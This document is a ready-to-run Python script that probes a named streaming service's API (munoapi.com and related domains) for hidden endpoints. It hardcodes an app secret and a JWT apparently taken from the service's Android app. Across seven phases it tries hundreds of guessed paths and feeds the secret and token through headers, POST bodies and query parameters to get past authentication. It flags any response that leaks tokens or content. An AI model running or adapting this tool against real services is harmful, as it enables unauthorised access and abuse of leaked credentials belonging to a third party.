#!/usr/bin/env python3
"""
Fast Munowatch API Hidden Endpoint Probe
==========================================
Thorough but optimized probe of https://munoapi.com/api/ endpoints.
"""

import json, time, sys
import requests
from datetime import datetime

BASE_URL = "https://munoapi.com/api"
APPSECRET = "022778e418ad68ffda9aa4fab1892fff"
USER_ID = "82717"
USER_AGENT = "Android IOS v3.0"
ORIGINAL_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IkFuZHJvaWQgVFYiLCJhcHBuYW1lIjoiTXVub3dhdGNoIFRWIiwiaG9zdCI6Im11bm93YXRjaC5jbyIsImFwcHNlY3JldCI6IjAyMjc3OGU0MThhZDY4ZmZkYTlhYTRmYWIxODkyZmZmIiwiYWN0aXZhdGVkIjoiMSIsImV4cCI6MTcwNzM2ODQwMH0.unlPnEzptg6VFHs7WWm213bRHHNxYuAN2eZQvjtPKL0"
OUTPUT_FILE = "/home/z/my-project/api_probe_results.json"

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[1m"; D = "\033[90m"; C = "\033[96m"; X = "\033[0m"

def base_h():
    return {"Accept": "application/json", "User-Agent": USER_AGENT}

def req(method, url, headers=None, data=None, timeout=6):
    try:
        r = requests.request(method, url, headers=headers or base_h(), json=data, timeout=timeout, allow_redirects=False)
        bj = None
        try: bj = r.json()
        except: pass
        return r.status_code, bj, r.text[:500], dict(r.headers)
    except requests.exceptions.Timeout:
        return 0, None, "TIMEOUT", {}
    except requests.exceptions.ConnectionError:
        return 0, None, "CONN_ERR", {}
    except Exception as e:
        return 0, None, str(e)[:80], {}

def probe(ep, method="GET", headers=None, data=None, timeout=6, label="", cat=""):
    url = f"{BASE_URL}/{ep}" if ep else BASE_URL
    s, bj, txt, rh = req(method, url, headers, data, timeout)
    entry = {
        "endpoint": ep, "url": url, "method": method, "label": label, "category": cat,
        "status_code": s, "body_json": bj, "body_text": txt[:500],
        "response_headers": {k:v for k,v in rh.items() if k.lower() in ("server","x-powered-by","content-type","allow","location","set-cookie")},
        "timestamp": datetime.utcnow().isoformat()+"Z"
    }
    if data: entry["request_data"] = data
    if headers:
        custom = {k:v for k,v in headers.items() if k not in ("Accept","User-Agent","Accept-Encoding")}
        if custom: entry["custom_headers"] = custom
    return entry, s, bj, txt, rh

# ═══ ALL ENDPOINTS ═══
ALL_ENDPOINTS = [
    # Auth
    "login","register","signup","signin","auth","authenticate",
    "auth/login","auth/register","auth/signup","auth/signin","auth/authenticate",
    "user/login","user/register","user/signup","user/signin","user/auth",
    "account/login","account/auth","member/login","member/auth",
    "v1/login","v2/login","v1/auth","v2/auth","v3/auth",
    "munowatch/login","munowatch/auth","muno/login","muno/auth",
    "tv/login","tv/auth","android/login","android/auth","sign-in","log-in",
    # Token/key
    "token","refresh","refresh-token","generate-token","new-token","api-key","generate-key",
    "auth/token","auth/refresh","auth/refresh-token","auth/generate-token",
    "token/generate","token/create","token/new","token/refresh","token/renew","token/issue",
    "token/verify","token/validate","token/check","refresh/token","refresh_token",
    "api/token","api/key","api/generate","api/keys",
    "apikey","apikeys","api_keys","key/generate","key/create","key/new","keys",
    "generate/key","generate/apikey","generate_token","create_token",
    "jwt","auth/jwt","api/jwt","access-token","access_token",
    "session","session/new","session/create","oauth","oauth/token","oauth2/token",
    "client/token","credential","credentials",
    # User
    "user","users","profile","account","me",
    "user/me","user/profile","user/info","user/details","user/data",
    "account/me","account/profile","account/info","account/details",
    "profile/info","profile/me","member","member/me","member/info","whoami","myself","self","identity",
    "admin","admin/login","admin/user","admin/users","admin/dashboard","staff","moderator",
    # System
    "dashboard-data","stats","config","settings","info","status","health","ping","version",
    "dashboard","dashboard/info","dashboard/stats",
    "system/info","system/status","system/config","system/health",
    "api/info","api/status","api/config","api/version",
    "server/info","server/status","app/info","app/config","app/status","app/version",
    "meta","metadata","about","uptime","ready","live","check","test",
    "environment","env","debug","docs","swagger","openapi","api-docs",
    "schema","graphql","playground","help","support","contact","changelog",
    # Content
    "categories","category","genre","genres","tags","popular","trending","latest","new","recent","top",
    "browse","explore","discover","featured","recommend","recommended",
    "movies","series","episodes","videos","video","media",
    "shows","shows-all","shows/all","all","home",
    "trending/movies","trending/series","popular/movies","popular/series",
    "latest/movies","latest/series","top/movies","top/series",
    "new/movies","new/series","recent/movies","recent/series",
    "categories/movies","categories/series","genre/action","genre/drama","genre/comedy",
    "list","lists","search","query","find","random","calendar","ratings","reviews",
    "collections","playlist","favorites","favourites","watchlist","history","continue",
    # Media
    "download","stream","play","embed","source","link","resolve",
    "download/url","stream/url","play/url","media/url","video/url",
    "resolve/url","resolve/link","player","player/embed",
    "m3u8","hls","mpd","dash","subtitle","subtitles","thumbnail","thumbnails",
    # Known
    "search","browse","list","shows","preview",
    "dashboard/v2","dashboard/v2/82717","preview/63003","preview/63003/82717","preview/v2/63003/82717",
    "search/Avengers/82717/0","browse/tabs","list/5/0/82717/0","shows/5/0/82717/0",
    # License
    "key","license","activate","device","subscribe",
    "key/activate","key/verify","key/validate","license/activate","license/verify",
    "activate/device","activate/app","device/register","device/activate","device/auth",
    "subscribe","subscription","subscription/activate","plan","plans","pricing","trial","premium","vip",
    "otp","otp/verify","otp/send",
    # Hidden
    "","v1","v2","v3","v4","v5",
    "public","public/api","open","free","guest",
    "external","webhook","callback","notification","notifications",
    "payment","pay","checkout","billing","report","analytics",
    "cdn","cache","image","upload","test","testing","dev","staging",
    "rest","rest/v1","rpc","json","xml","csv","feed","rss",
    "socket","ws","websocket","console","munowatch","muno","tv",
    "app","apps","application","client","clients","partner","developer","developers",
    "sdk","integration","webhooks","hooks","rate-limit","quota","usage",
    "feature","features","internal","private","protected","secure",
]

QUERY_PARAM_ENDPOINTS = [
    "dashboard","dashboard/82717","search","browse","list","shows","preview",
    "preview/63003","categories","popular","trending","latest","movies",
    "user","profile","me","account","config","info","status","search/Avengers",
]

POST_PAYLOADS = [
    {"username":"Android TV","password":APPSECRET,"appsecret":APPSECRET},
    {"appname":"Munowatch TV","appsecret":APPSECRET,"host":"munowatch.co"},
    {"user_id":USER_ID,"appsecret":APPSECRET,"host":"munowatch.co"},
    {"appname":"Munowatch TV","host":"munowatch.co","appsecret":APPSECRET,"username":"Android TV"},
    {"api_key":APPSECRET,"host":"munowatch.co"},
    {"key":APPSECRET,"appname":"Munowatch TV"},
    {"secret":APPSECRET,"host":"munowatch.co"},
    {"grant_type":"client_credentials","client_secret":APPSECRET,"client_id":"munowatch"},
]

results = []
total = 0
start = time.time()

print(f"\n{B}{C}{'='*75}{X}")
print(f"{B}{C}  MUNOWATCH API HIDDEN ENDPOINT PROBE{X}")
print(f"{B}{C}  Target: {BASE_URL}  |  {len(ALL_ENDPOINTS)} endpoints{X}")
print(f"{B}{C}{'='*75}{X}\n")

# ─── PHASE 1: GET sweep (no auth) ─────────────────────────────
print(f"{B}PHASE 1: GET sweep ({len(ALL_ENDPOINTS)} endpoints, no auth){X}\n")

for ep in ALL_ENDPOINTS:
    entry, s, bj, txt, rh = probe(ep, method="GET", label="GET no-auth", cat="sweep")
    results.append(entry); total += 1

    if s not in (0, 404):
        jstr = json.dumps(bj).lower() if bj else txt.lower()
        has_data = bj and isinstance(bj, dict) and len(bj) > 0
        has_token = any(w in jstr for w in ("token","api_key","jwt","eyj","bearer","secret")) if bj else False
        has_content = any(k in bj for k in ("dashboard","banner","search","results","preview","data","movies","videos","shows","categories")) if bj and isinstance(bj, dict) else False

        if s == 200:
            if has_token:
                print(f"  {R}{B}TOKEN{X} GET /{ep:<40} → 200  {json.dumps(bj)[:150]}")
            elif has_content:
                print(f"  {G}DATA{X}  GET /{ep:<40} → 200  keys: {list(bj.keys())[:6]}")
            elif has_data:
                print(f"  {Y}*{X}    GET /{ep:<40} → 200  keys: {list(bj.keys())[:6]}")
            else:
                print(f"  {D}200{X}   GET /{ep:<40} → 200  {txt[:80]}")
        elif s in (401, 403):
            detail = json.dumps(bj)[:80] if bj else txt[:60]
            print(f"  {Y}403{X}   GET /{ep:<40} → {s}  {detail}")
        elif s == 405:
            print(f"  {Y}405{X}   GET /{ep:<40} → 405 (method not allowed)")
        elif s >= 500:
            if bj and isinstance(bj, dict):
                exc = bj.get("exception",[])
                if isinstance(exc,list) and exc:
                    print(f"  {R}500{X}   GET /{ep:<40} → {s}  LEAK: {json.dumps(exc[0])[:80]}")
                else:
                    print(f"  {D}{s}{X}   GET /{ep:<40} → {s}")
            else:
                print(f"  {D}{s}{X}   GET /{ep:<40} → {s}")
        else:
            print(f"  {D}{s}{X}   GET /{ep:<40} → {s}")

    time.sleep(0.05)

# ─── PHASE 2: Auth header variations on non-404 endpoints ────
live_eps = list(dict.fromkeys(r["endpoint"] for r in results if r["status_code"] not in (0, 404)))
print(f"\n{B}PHASE 2: Auth header variations on {len(live_eps)} live endpoints{X}\n")

auth_variations = [
    ("X-API-Key:secret", {**base_h(), "X-API-Key": APPSECRET}),
    ("Bearer:secret", {**base_h(), "Authorization": f"Bearer {APPSECRET}"}),
    ("X-App-Secret", {**base_h(), "X-App-Secret": APPSECRET}),
    ("X-API-Key:token", {**base_h(), "X-API-Key": ORIGINAL_TOKEN, "Authorization": f"Bearer {ORIGINAL_TOKEN}"}),
]

for ep in live_eps:
    for auth_name, auth_headers in auth_variations:
        entry, s, bj, txt, rh = probe(ep, method="GET", headers=auth_headers, label=f"GET {auth_name}", cat="auth_var")
        results.append(entry); total += 1

        if s == 200 and bj and isinstance(bj, dict):
            jstr = json.dumps(bj).lower()
            has_content = any(k in bj for k in ("dashboard","banner","search","results","preview","data","movies","videos","shows","categories"))
            has_token = any(w in jstr for w in ("token","api_key","jwt","eyj"))
            if has_token or has_content:
                print(f"  {R}{B}HIT{X} {auth_name:<18} /{ep:<35} → 200  keys: {list(bj.keys())[:6]}")
                print(f"    {D}{json.dumps(bj)[:150]}{X}")
        time.sleep(0.04)

# ─── PHASE 3: POST payloads on auth endpoints ────────────────
auth_eps = [e for e in ALL_ENDPOINTS if any(e.startswith(p) for p in ("login","register","signup","signin","auth","token","apikey","key","activate","license","device","subscribe","credential","session","jwt","oauth"))]
auth_eps = list(dict.fromkeys(auth_eps))
print(f"\n{B}PHASE 3: POST payloads on {len(auth_eps)} auth endpoints × {len(POST_PAYLOADS)} payloads{X}\n")

for ep in auth_eps:
    for payload in POST_PAYLOADS:
        pk = list(payload.keys())[0]
        entry, s, bj, txt, rh = probe(ep, method="POST", data=payload, label=f"POST {pk}", cat="auth_post")
        results.append(entry); total += 1

        if s in (200, 201) and bj:
            jstr = json.dumps(bj).lower()
            if any(w in jstr for w in ("token","key","jwt","eyj","success","ok","true","created")):
                print(f"  {R}{B}HIT{X} POST /{ep:<30} ({pk}) → {s}  {json.dumps(bj)[:150]}")
        elif s == 422 and bj:
            print(f"  {Y}422{X}   POST /{ep:<30} ({pk}) → 422  {json.dumps(bj)[:100]}")
        time.sleep(0.04)

# ─── PHASE 4: Query param auth ───────────────────────────────
print(f"\n{B}PHASE 4: Query param auth on {len(QUERY_PARAM_ENDPOINTS)} endpoints × 9 params{X}\n")

qparams = [
    ("?key=",APPSECRET),("?api_key=",APPSECRET),("?token=",APPSECRET),
    ("?secret=",APPSECRET),("?appsecret=",APPSECRET),("?apikey=",APPSECRET),
    ("?access_key=",APPSECRET),("?auth_token=",APPSECRET),("?X-API-Key=",APPSECRET),
]

for ep in QUERY_PARAM_ENDPOINTS:
    for pname, pval in qparams:
        url = f"{BASE_URL}/{ep}{pname}{pval}"
        s, bj, txt, rh = req("GET", url)
        entry = {
            "endpoint":ep,"url":url,"method":"GET","label":f"GET {pname}","category":"query_param",
            "status_code":s,"body_json":bj,"body_text":txt[:500],"timestamp":datetime.utcnow().isoformat()+"Z"
        }
        results.append(entry); total += 1

        if s == 200 and bj and isinstance(bj, dict):
            has_content = any(k in bj for k in ("dashboard","banner","search","results","preview","data","movies","videos"))
            if has_content:
                print(f"  {R}{B}HIT{X} {pname:<16} /{ep:<30} → 200  keys: {list(bj.keys())[:6]}")
        time.sleep(0.04)

# ─── PHASE 5: Known endpoints with original JWT ──────────────
known = ["dashboard","dashboard/v2/82717","search/Avengers/82717/0","preview/63003/82717",
         "preview/v2/63003/82717","browse/tabs","list/5/0/82717/0","shows/5/0/82717/0",
         "dashboard","search","browse","list","shows","preview","categories","popular","latest"]
print(f"\n{B}PHASE 5: Known endpoints with original JWT{X}\n")

jwt_h = {**base_h(), "X-API-Key": ORIGINAL_TOKEN, "Authorization": f"Bearer {ORIGINAL_TOKEN}"}

for ep in known:
    entry, s, bj, txt, rh = probe(ep, method="GET", headers=jwt_h, label="GET JWT", cat="known_jwt")
    results.append(entry); total += 1
    if s == 200:
        print(f"  {G}OK{X}  JWT /{ep:<45} → 200  keys: {list(bj.keys())[:6] if bj and isinstance(bj,dict) else 'N/A'}")
    elif s in (400, 401):
        print(f"  {R}FAIL{X} JWT /{ep:<45} → {s}  {json.dumps(bj)[:80] if bj else txt[:60]}")
    time.sleep(0.05)

# ─── PHASE 6: Alternative URLs ───────────────────────────────
print(f"\n{B}PHASE 6: Alternative URLs{X}\n")

alt_urls = [
    "https://munoapi.com","https://munoapi.com/api/","https://munoapi.com/api//",
    "https://munoapi.com/api/v1","https://munoapi.com/api/v2","https://munoapi.com/api/v3",
    "https://munoapi.com/api/index.php","https://munoapi.com/api/dashboard.json",
    "https://munowatch.co/api","https://munowatch.co/api/dashboard",
    "https://munowatch.co/api/v1","https://api.munowatch.co","https://api.munowatch.co/api",
    "https://hamcodz.duckdns.org/api","https://hamcodz.duckdns.org",
    f"{BASE_URL}?key={APPSECRET}",f"{BASE_URL}?api_key={APPSECRET}",
    f"{BASE_URL}?token={APPSECRET}",f"{BASE_URL}?secret={APPSECRET}",
    f"{BASE_URL}?appsecret={APPSECRET}",f"{BASE_URL}/?format=json",
    f"{BASE_URL}/?callback=test",
]

for url in alt_urls:
    s, bj, txt, rh = req("GET", url)
    entry = {"endpoint":url,"url":url,"method":"GET","label":"alt_url","category":"alt_url",
             "status_code":s,"body_json":bj,"body_text":txt[:500],
             "response_headers":{k:v for k,v in rh.items() if k.lower() in ("server","x-powered-by","content-type","location")},
             "timestamp":datetime.utcnow().isoformat()+"Z"}
    results.append(entry); total += 1
    if s not in (0, 404):
        detail = json.dumps(bj)[:100] if bj else txt[:80]
        if s in (301,302,307): detail = f"→ {rh.get('location','?')}"
        print(f"  {G}{s}{X}  {url:<60}  {detail[:60]}")
    time.sleep(0.06)

# ─── PHASE 7: OPTIONS/HEAD on key endpoints ──────────────────
print(f"\n{B}PHASE 7: OPTIONS/HEAD on key endpoints{X}\n")

key_eps = ["","dashboard","search","preview","login","token","auth","user","browse","list","shows","categories"]
for ep in key_eps:
    # OPTIONS
    entry, s, bj, txt, rh = probe(ep, method="OPTIONS", label="OPTIONS", cat="preflight")
    results.append(entry); total += 1
    allow = rh.get("allow","")
    if s in (200,204) and allow:
        print(f"  {G}OPT{X}  /{ep:<40} → {s}  Allow: {allow}")
    # HEAD
    entry, s, bj, txt, rh = probe(ep, method="HEAD", label="HEAD", cat="preflight")
    results.append(entry); total += 1
    server = rh.get("server","")
    powered = rh.get("x-powered-by","")
    if s not in (0, 404) and (server or powered):
        print(f"  {D}HEAD{X} /{ep:<40} Server: {server}  Powered: {powered}")
    time.sleep(0.04)

# ═══ SAVE & SUMMARIZE ════════════════════════════════════════

elapsed = time.time() - start

# Gather stats
status_dist = {}
for r in results:
    sc = str(r.get("status_code",0))
    status_dist[sc] = status_dist.get(sc, 0) + 1

all_200 = [r for r in results if r.get("status_code") == 200]
interesting = []
for r in all_200:
    bj = r.get("body_json")
    if bj and isinstance(bj, dict):
        jstr = json.dumps(bj).lower()
        has_token = any(w in jstr for w in ("token","api_key","jwt","eyj","bearer","secret"))
        has_content = any(k in bj for k in ("dashboard","banner","search","results","preview","data","movies","videos","shows","categories","popular","latest","trending"))
        has_keys = len(bj) > 0 and not any(k in bj for k in ("400","401","403","404","500"))
        if has_token or has_content or has_keys:
            interesting.append((r, "TOKEN" if has_token else "CONTENT" if has_content else "DATA"))

# Server info
servers = set(); powereds = set()
for r in results:
    rh = r.get("response_headers",{})
    if rh.get("server"): servers.add(rh["server"])
    if rh.get("x-powered-by"): powereds.add(rh["x-powered-by"])

summary = {
    "target": BASE_URL,
    "timestamp": datetime.utcnow().isoformat()+"Z",
    "elapsed_seconds": round(elapsed, 1),
    "total_requests": total,
    "unique_endpoints": len(ALL_ENDPOINTS),
    "status_distribution": status_dist,
    "http_200_count": len(all_200),
    "useful_data_count": len(interesting),
    "server_info": {"server": list(servers), "x_powered_by": list(powereds)},
    "interesting_200": [
        {"endpoint":r["endpoint"],"url":r["url"],"method":r["method"],"label":r["label"],
         "reason":reason,"body_keys":list(r["body_json"].keys())[:10] if r.get("body_json") and isinstance(r["body_json"],dict) else [],
         "body_preview":json.dumps(r["body_json"])[:400] if r.get("body_json") else r.get("body_text","")[:400]}
        for r,reason in interesting
    ],
    "discovered_endpoints": sorted(set(r["endpoint"] for r in results if r["status_code"] not in (0,404))),
}

output = {"summary": summary, "all_results": results}
with open(OUTPUT_FILE, "w") as f:
    json.dump(output, f, indent=2, default=str, ensure_ascii=False)

# Print final summary
print(f"\n{B}{C}{'='*75}{X}")
print(f"{B}{C}  FINAL SUMMARY{X}")
print(f"{B}{C}{'='*75}{X}")
print(f"  Time: {elapsed:.1f}s  |  Requests: {total}  |  200s: {len(all_200)}  |  Useful: {len(interesting)}")
print(f"  Server: {list(servers)}  |  X-Powered-By: {list(powereds)}")
print(f"\n  {B}Status Distribution:{X}")
for sc, cnt in sorted(status_dist.items(), key=lambda x: int(x[0]) if x[0].isdigit() else 999):
    bar = "█"*min(cnt,40)
    print(f"    {sc:>5}: {cnt:>4}  {D}{bar}{X}")

if interesting:
    print(f"\n  {R}{B}USEFUL DATA RESPONSES ({len(interesting)}):{X}")
    for r, reason in interesting:
        ep = r["endpoint"]; label = r["label"]
        bj = r.get("body_json")
        snippet = json.dumps(bj)[:150] if bj else r.get("body_text","")[:100]
        print(f"    {G}●{X} {r['method']:<5} /{ep:<40} [{label}]  {reason}")
        print(f"      {D}{snippet}{X}")

discovered = summary["discovered_endpoints"]
print(f"\n  {B}Non-404 endpoints ({len(discovered)}):{X}")
for ep in discovered:
    print(f"    {C}•{X} /{ep}")

print(f"\n  Saved to: {G}{OUTPUT_FILE}{X}")
print(f"\n{B}{C}{'='*75}{X}")
